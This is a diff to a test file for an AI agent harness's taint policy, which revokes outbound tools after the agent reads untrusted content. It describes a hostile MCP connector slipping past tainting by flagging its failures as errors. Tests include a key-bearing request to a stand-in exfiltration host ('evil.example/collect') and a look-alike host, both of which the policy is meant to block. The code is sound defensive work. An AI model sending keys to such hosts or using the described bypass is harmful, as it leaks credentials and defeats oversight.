@@ -198,7 +198,7 @@ A.eq(taint.postTaintBoundary(FS_WRITE, { taintedBy: 'web_fetch', surface: 'auton
   // the reasoning that "a failed fetch put nothing in front of the model" — true for web_fetch (it throws a
   // bare `http <status>`), FALSE for an MCP connector whose failure text IS the server's payload and reaches
   // the model verbatim. `isError: true` was therefore a one-flag bypass of the whole taint rule.
-  A.ok(/if \(!execution\.taintedBy\(\) && r && typeof r\.content === 'string' && r\.content\.length && revokedByTaint\.isSource/.test(src),
+  A.ok(/if \(r && typeof r\.content === 'string' && r\.content\.length && revokedByTaint\.isSource\(liveTool, c\)\) \{\s*taintScope = [^\n]*\n\s*if \(!execution\.taintedBy\(\)\) latchRunTaint\(c\.name\);/.test(src),
     'any untrusted-source result carrying real content taints — an isError flag is not an exemption');
   A.ok(!/!r\.isError && typeof r\.content === 'string' && r\.content\.length && revokedByTaint\.isSource/.test(src),
     'the isError exemption is gone (a hostile connector cannot opt out of taint by failing)');
@@ -247,6 +247,44 @@ A.eq(taint.postTaintBoundary(FS_WRITE, { taintedBy: 'web_fetch', surface: 'auton
   // SEND TO (2026-10-10): a hand-off's entry run reads another line's OUTPUT — it begins tainted like any chain hop
   A.ok(/makeHub: \(hooks\) => makeTriggerHub\(Object\.assign\(\{\}, hooks, \{ persona: HANDOFF_PERSONA, entryTaint: 'upstream line output' \}\)\)/.test(idx), 'SEND TO hand-off runs (another line\'s output) begin tainted');
   A.ok(/initialTaint: 'upstream agent output'/.test(hub), 'agent-chain hops cannot treat upstream output as Commander-authored');
+}
+
+// ---- SAME-ORIGIN API CONTINUATION (owner decision 2026-10-12, Etsy-factory Publisher report) ----
+// Reading one API's response revoked web_request: one card per call in a watched run ("session" collapsed to once),
+// a refusal in an unattended one — so no GET-then-PUT API job could run hands-off. The continuation lets the run keep
+// calling THAT https origin with keys it already sent there; everything else keeps the lock.
+{
+  const wr = { name: 'web_request', capability: 'web', scope: 'write', impact: 'external-credentialed' };
+  const call = (url, extra) => ({ name: 'web_request', args: Object.assign({ url }, extra || {}) });
+  const P = 'https://api.printify.com/v1/shops/1/products/5de6593ebff03b5313567d22.json';
+  const key = { headers: { Authorization: 'Bearer ${PRINTIFY_API_KEY}' } };
+  let s = taint.scopeAfterSource(null, wr, call(P, key), { wasTainted: false, runId: 'r1' });
+  A.eq(JSON.stringify(s), '{"origin":"https://api.printify.com","keys":["PRINTIFY_API_KEY"]}', 'the first API read scopes the run to that origin + key');
+  A.ok(taint.sameOriginContinuation(s, wr, call(P, Object.assign({ method: 'PUT', body: '{}' }, key))), 'a PUT back to the same API with the same key continues without a card');
+  A.ok(taint.sameOriginContinuation(s, wr, call('https://api.printify.com/v1/uploads/images.json', Object.assign({ method: 'POST' }, key))), 'any path on the same origin');
+  A.ok(!taint.sameOriginContinuation(s, wr, call('https://evil.example/collect', key)), 'another host keeps the lock (no exfiltration with the key)');
+  A.ok(!taint.sameOriginContinuation(s, wr, call('https://api.printify.com.evil.example/x', key)), 'a look-alike host keeps the lock');
+  A.ok(!taint.sameOriginContinuation(s, wr, call('http://api.printify.com/v1/x', key)), 'plain http keeps the lock');
+  A.ok(!taint.sameOriginContinuation(s, wr, call(P, { headers: { Authorization: 'Bearer ${STRIPE_API_KEY}' } })), 'a key the run never sent there keeps the lock');
+  A.ok(!taint.sameOriginContinuation(s, wr, call(P, { auth: { key: 'OTHER_API_KEY', in: 'query', name: 'k' } })), 'the auth descriptor key is checked too');
+  A.ok(!taint.sameOriginContinuation(s, wr, call(P, key), { untrustedEntry: true }), 'a run whose ENTRY was untrusted never continues');
+  A.ok(!taint.sameOriginContinuation(s, { name: 'shell.exec', impact: 'workspace-process' }, { name: 'shell.exec', args: { url: P } }), 'only web_request continues — the shell stays revoked');
+  // reading this run's own park of that response keeps the scope; anything else broadens it for good
+  const fsRead = { name: 'fs.read', capability: 'cabinet', scope: 'read' };
+  A.eq(taint.scopeAfterSource(s, fsRead, { name: 'fs.read', args: { path: '.output/untrusted-web_request-r1-0.txt' } }, { wasTainted: true, runId: 'r1' }), s, 'reading this run\'s own park keeps the scope');
+  A.ok(taint.scopeAfterSource(s, fsRead, { name: 'fs.read', args: { path: '.output/untrusted-web_fetch-OTHERRUN-0.txt' } }, { wasTainted: true, runId: 'r1' }).broad, 'another run\'s park broadens');
+  A.ok(taint.scopeAfterSource(s, { name: 'web_fetch', capability: 'web' }, { name: 'web_fetch', args: { url: 'https://blog.example' } }, { wasTainted: true }).broad, 'a web page broadens');
+  A.ok(taint.scopeAfterSource(s, wr, call('https://api.stripe.com/v1/x', key), { wasTainted: true }).broad, 'a second API origin broadens');
+  A.ok(taint.scopeAfterSource(s, wr, call(P, { headers: { Authorization: 'Bearer ${OTHER_API_KEY}' } }), { wasTainted: true }).broad, 'a new key on the same origin broadens');
+  A.ok(taint.scopeAfterSource(null, wr, call(P, key), { wasTainted: true }).broad, 'a run tainted before its first API read (start/inherited/replay) is broad');
+  const broad = { broad: true };
+  A.eq(taint.scopeAfterSource(broad, wr, call(P, key), { wasTainted: true }), broad, 'broad never narrows again');
+  A.ok(!taint.sameOriginContinuation(broad, wr, call(P, key)), 'a broad scope never continues');
+  // wiring: one gate, before the boundary; the scope follows every source and relayed taint
+  const idx = fs.readFileSync(path.join(__dirname, '..', 'sidecar', 'index.js'), 'utf8');
+  A.ok(/const sameOriginApi = !!taintSource && !inheritedTaint && taintSource === execution\.taintedBy\(\)\s*&& taintPolicy\.sameOriginContinuation\(taintScope, liveTool, c, \{ untrustedEntry: untrustedEntryRun \}\);\s*let postTaint = sameOriginApi \?/.test(idx), 'the dispatch gate consults the scope (never for an inherited taint)');
+  A.ok(/taintScope = taintPolicy\.scopeAfterSource\(taintScope, liveTool, c, \{ wasTainted: !!execution\.taintedBy\(\), runId \}\);/.test(idx), 'every untrusted result updates the scope, not only the first');
+  A.ok(/if \(relayed\) \{ latchRunTaint\(relayed\); taintScope = \{ broad: true \}; \}/.test(idx), 'relayed worker taint makes the scope broad');
 }
 
 if (require.main === module) A.report('untrusted-taint.test');
